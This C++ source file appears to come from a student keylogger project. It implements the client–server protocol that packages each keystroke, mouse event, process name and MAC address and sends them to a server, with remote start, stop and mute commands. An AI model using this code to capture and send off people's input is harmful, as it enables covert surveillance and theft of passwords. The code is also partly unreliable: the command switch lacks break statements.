//
// Protocolv1.cpp for Protocolv1 in /home/plasko_a/projet/cplusplus/cpp_spider/lib/protocolv1/source
// 
// Made by Antoine Plaskowski
// Login   <antoine.plaskowski@epitech.eu>
// 
// Started on  Thu Oct 22 09:18:51 2015 Antoine Plaskowski
// Last update Mon Oct 26 07:51:32 2015 Antoine Plaskowski
//

#include	<iostream>
#include	<cassert>
#include	<exception>
#include	"Protocolv1.hpp"

Protocolv1::Protocolv1(ISocket &socket, ITime &time) :
  m_socket(socket),
  m_last_read(time),
  m_mac_address(),
  m_packets(),
  m_write(0),
  m_to_write(0),
  m_read(),
  m_is_connect(false),
  m_is_stop(false),
  m_is_mute(false),
  m_wait_pong(false)
{
  m_last_read.now();
}

Protocolv1::~Protocolv1(void)
{
  delete (&m_socket);
  delete (&m_last_read);
}

bool	Protocolv1::run(IDatabase const &database, ITime const *time)
{
  if (m_socket.can_read() == true)
    if (read(database) == true)
      return (true);
  if (time != nullptr)
    if (timeout(*time) == true)
      return (true);
  if (m_socket.can_write() == true)
    return (write());
  return (false);
}

bool	Protocolv1::select(void) const
{
  m_socket.want_read();
  if (m_to_write != m_write)  
    m_socket.want_write();
  return (false);
}

bool	Protocolv1::timeout(ITime const &time)
{
  intmax_t	second = m_last_read.get_second();
  intmax_t	nano = m_last_read.get_nano();

  m_last_read.now();
  if (m_last_read.get_second() - second > time.get_second())
    {
      if (m_wait_pong == true)
	return (true);
      return (write_ping());
    }
  else if (m_last_read.get_second() - second == time.get_second() && m_last_read.get_nano() - nano > time.get_nano())
    {
      if (m_wait_pong == true)
	return (true);
      return (write_ping());
    }
  m_last_read.set_second(second);
  m_last_read.set_nano(nano);
  return (false);
}

bool	Protocolv1::read(IDatabase const &database)
{
  m_last_read.now();
  m_wait_pong = false;
  if (m_read.read(m_socket) == true)
    return (true);
  if (m_read.is_read() == false)
    return (false);
  bool	ret;
  switch (m_read.get_opcode())
    {
    case (APacket::RESULT):
      ret = read_result();
      break;
    case (APacket::MAC_ADDRESS):
      ret = read_mac_address();
      break;
    case (APacket::VERSION):
      ret = read_version();
      break;
    case (APacket::CONNECT):
      ret = read_connect();
      break;
    case (APacket::DISCONNECT):
      ret = read_disconnect();
      break;
    case (APacket::SERVERCMD):
      ret = read_servercmd();
      break;
    case (APacket::CLIENTLOG):
      ret = read_clientlog(database);
      break;
    case (APacket::PING):
      ret = read_ping();
      break;
    case (APacket::PONG):
      ret = read_pong(); 
      break;
    case (APacket::KEYBOARD):
      ret = read_keyboard(database);
      break;
    case (APacket::MOUSE):
      ret = read_mouse(database);
      break;
    default:
      ret = true;
      break;
    };
  m_read.reset();
  return (ret);
}

bool	Protocolv1::write(void)
{   
  if (m_to_write != m_write)
    {
      if (m_packets[m_to_write].write(m_socket) == true)
	return (true);
      if (m_packets[m_to_write].is_write() == true)
	m_to_write++;
    }
  return (false);
}

bool	Protocolv1::server_command(Commandcode command)
{
  return (write_servercmd(command));
}

std::string const     &Protocolv1::get_mac_address(void) const
{
  return (m_mac_address);
}

bool	Protocolv1::mac_address(std::string const &mac_address)
{
  return (write_mac_address(mac_address));
}

bool	Protocolv1::log(std::string const &log)
{
  return (write_clientlog(log));
}

bool	Protocolv1::keyboard(ITime const &time, std::string const &event, std::string const &key, std::string const &process)
{
  return (write_keyboard(time, event, key, process));
}

bool	Protocolv1::mouse(ITime const &time, uintmax_t x, uintmax_t y, uintmax_t amout, std::string const &event, std::string const &button, std::string const &process)
{
  return (write_mouse(time, x, y, amout, event, button, process));
}

bool	Protocolv1::read_result(void)
{
  uint8_t	code;

  if (m_read.get_int<uint8_t>(code) == true)
    return (true);
  switch (static_cast<Errorcode>(code))
    {
    case (NO_ERROR):
      std::cout << "no_error" << std::endl;
      return (false);
    case (IGNORED):
      std::cout << "ignored" << std::endl;
      break;
    case (UNKNOWN_ERROR):
      std::cout << "unknow_error" << std::endl;
      break;
    case (CLIENT_ALREADY_STARTED):
      std::cout << "client_already_started" << std::endl;
      break;
    case (CLIENT_ALREADY_STOPPED):
      std::cout << "client_already_stopped" << std::endl;
      break;
    case (CLIENT_ALREADY_MUTED):
      std::cout << "client_already_muted" << std::endl;
      break;
    case (CLIENT_ALREADY_UNMUTED):
      std::cout << "client_already_unmuted" << std::endl;
      break;
    case (INVALID_COMMAND):
      std::cout << "invalid_command" << std::endl;
      break;
    case (INVALID_KEYBOARD_INPUT):
      std::cout << "invalid_keyboard_input" << std::endl;
      break;
    case (INVALID_MOUSE_INPUT):
      std::cout << "invalid_mouse_input" << std::endl;
      break;
    case (UNKNOWN_ID):
      std::cout << "unknown_id" << std::endl;
      break;
    case (WRONG_PROTOCOL_VERSION):
      std::cout << "wrong_protocol_version" << std::endl;
      break;
    case (WRONG_MAC_ADDRESS):
      std::cout << "wrong_mac_address" << std::endl;
      break;
    case (CONNECT_FAIL):
      std::cout << "connect_fail" << std::endl;
      break;
    case (DISCONNECT_FAIL):
      std::cout << "disconnect_fail" << std::endl;
      break;
    }
  uint8_t	id;
  if (m_read.get_int<uint8_t>(id) == true)
    return (true);
  std::cout << "id du proccesus " << static_cast<uintmax_t>(id) << std::endl;
  return (true);
}

bool	Protocolv1::write_result(Errorcode code, uint8_t id)
{
  Packetwrite	&packet = m_packets[m_write];

  if (packet.put_int<Errorcode>(code) == true)
    return (true);
  if (packet.put_int<uint8_t>(id))
    return (true);
  return (write_packet(APacket::RESULT));
}

bool	Protocolv1::read_mac_address(void)
{
  m_mac_address.erase();
  for (uintmax_t i = 0; i < 6; i++)
    {
      uint8_t	c;
      if (m_read.get_int<uint8_t>(c) == true)
	return (true);
      m_mac_address += c;
    }
  std::cout << m_mac_address << std::endl;
  return (false);
}

bool	Protocolv1::write_mac_address(std::string const &mac_address)
{
  Packetwrite	&packet = m_packets[m_write];

  for (uintmax_t i = 0; i < 6 && i < mac_address.size(); i++)
    if (packet.put_int<uint8_t>(mac_address[i]))
      return (true);
  return (write_packet(APacket::MAC_ADDRESS));
}

bool	Protocolv1::read_version(void)
{
  uint8_t	version;

  if (m_read.get_int<uint8_t>(version) == true)
    return (true);
  if (version == 1)
    return (write_result(NO_ERROR, m_read.get_id()));
  return (write_result(WRONG_PROTOCOL_VERSION, m_read.get_id()));
}

bool	Protocolv1::write_version(void)
{
  Packetwrite	&packet = m_packets[m_write];

  if (packet.put_int<uint8_t>(1) == true)
    return (true);  
  return (write_packet(APacket::VERSION));
}

bool	Protocolv1::read_connect(void)
{
  m_is_connect = true;
  return (false);
}

bool	Protocolv1::write_connect(void)
{
  return (write_packet(APacket::CONNECT));
}

bool	Protocolv1::read_disconnect(void)
{
  m_is_connect = false;
  return (true);
}

bool	Protocolv1::write_disconnect(void)
{
  return (write_packet(APacket::DISCONNECT));
}

bool	Protocolv1::read_servercmd(void)
{
  uint8_t	code;

  if (m_read.get_int<uint8_t>(code) == true)
    return (true);
  switch (static_cast<Commandcode>(code))
    {
    case (START):
      m_is_stop = false;
    case (STOP):
      m_is_stop = true;
    case (MUTE):
      m_is_mute = true;
    case (UNMUTE):
      m_is_mute = false;
    }
  return (false);
}

bool	Protocolv1::write_servercmd(Commandcode command)
{
  Packetwrite	&packet = m_packets[m_write];

  if (packet.put_int<Commandcode>(command) == true)
    return (true);
  return (write_packet(APacket::SERVERCMD));
}

bool	Protocolv1::read_clientlog(IDatabase const &database)
{
  std::string	log;

  if (m_read.get_string(log) == true)
    return (true);
  std::cout << log << std::endl;
  return (false);
}

bool	Protocolv1::write_clientlog(std::string const &log)
{
  Packetwrite	&packet = m_packets[m_write];

  if (packet.put_string(log) == true)
    return (true);
  return (write_packet(APacket::CLIENTLOG));
}

bool	Protocolv1::read_ping(void)
{
  std::cout << "ping" << std::endl;
  return (write_pong());
}

bool	Protocolv1::write_ping(void)
{
  m_wait_pong = true;
  return (write_packet(APacket::PING));
}

bool	Protocolv1::read_pong(void)
{
  m_wait_pong = false;
  std::cout << "pong" << std::endl;
  return (false);
}

bool	Protocolv1::write_pong(void)
{
  return (write_packet(APacket::PONG));
}

bool	Protocolv1::read_keyboard(IDatabase const &database)
{
  uint8_t	size_array;

  if (m_read.get_int<uint8_t>(size_array) == true)
    return (true);
  for (uint8_t i = 0; i < size_array; i++)
    {
      uint64_t	second;
      if (m_read.get_int<uint64_t>(second) == true)
	return (true);
      uint64_t	nano;
      if (m_read.get_int<uint64_t>(nano) == true)
	return (true);
      std::string	event;
      if (m_read.get_string(event) == true)
	return (true);
      std::string	key;
      if (m_read.get_string(key) == true)
	return (true);
      std::string	process;
      if (m_read.get_string(process) == true)
	return (true);
      std::cout << second << std::endl;
      std::cout << nano << std::endl;
      std::cout << event << std::endl;
      std::cout << key << std::endl;
      std::cout << process << std::endl;
    }
  return (false);
}

bool	Protocolv1::write_keyboard(ITime const &time, std::string const &event, std::string const &key, std::string const &process)
{
  Packetwrite	&packet = m_packets[m_write];

  if (packet.put_int<uint8_t>(1) == true)
    return (true);
  if (packet.put_int<uint64_t>(time.get_second()) == true)
    return (true);
  if (packet.put_int<uint64_t>(time.get_nano()) == true)
    return (true);
  if (packet.put_string(event) == true)
    return (true);
  if (packet.put_string(key) == true)
    return (true);
  if (packet.put_string(process) == true)
    return (true);
  return (write_packet(APacket::KEYBOARD));
}

bool	Protocolv1::read_mouse(IDatabase const &database)
{
  uint8_t	size_array;

  if (m_read.get_int<uint8_t>(size_array) == true)
    return (true);
  for (uintmax_t k = 0; k < size_array; k++)
    {
      uint64_t	second;
      if (m_read.get_int<uint64_t>(second) == true)
	return (true);
      uint64_t	nano;
      if (m_read.get_int<uint64_t>(nano) == true)
	return (true);
      uint32_t	x;
      if (m_read.get_int<uint32_t>(x) == true)
	return (true);
      uint32_t	y;
      if (m_read.get_int<uint32_t>(y) == true)
	return (true);
      uint64_t	amount;
      if (m_read.get_int<uint64_t>(amount) == true)
	return (true);
      std::string	event;
      if (m_read.get_string(event) == true)
	return (true);
      std::string	key;
      if (m_read.get_string(key) == true)
	return (true);
      std::string	process;
      if (m_read.get_string(process) == true)
	return (true);
      std::cout << second << "s " << nano << "n " << x << "x " << y << "y " << amount << "amount " << event << " " << key << " " << process << std::endl;
    }
  return (false);
}

bool	Protocolv1::write_mouse(ITime const &time, uintmax_t x, uintmax_t y, uintmax_t amount, std::string const &event, std::string const &button, std::string const &process)
{
  Packetwrite	&packet = m_packets[m_write];

  if (packet.put_int<uint8_t>(1) == true)
    return (true);
  if (packet.put_int<uint64_t>(time.get_second()) == true)
    return (true);
  if (packet.put_int<uint64_t>(time.get_nano()) == true)
    return (true);
  if (packet.put_int<uint32_t>(x) == true)
    return (true);
  if (packet.put_int<uint32_t>(y) == true)
    return (true);
  if (packet.put_int<uint64_t>(amount) == true)
    return (true);
  if (packet.put_string(event) == true)
    return (true);
  if (packet.put_string(button) == true)
    return (true);
  if (packet.put_string(process) == true)
    return (true);
  return (write_packet(APacket::MOUSE));
}

bool	Protocolv1::write_packet(APacket::Opcode code)
{
  Packetwrite	&packet = m_packets[m_write];

  packet.set_opcode(code);
  packet.set_id(m_write);
  packet.set_size();
  if (++m_write == m_to_write)
    m_to_write++;
  m_packets[m_write].reset();
  return (false);
}

ISocket const	&Protocolv1::get_isocket(void) const
{
  return (m_socket);
}

IProtocol	&new_iprotocol(ISocket &socket, ITime &time)
{
  return (*new Protocolv1(socket, time));
}
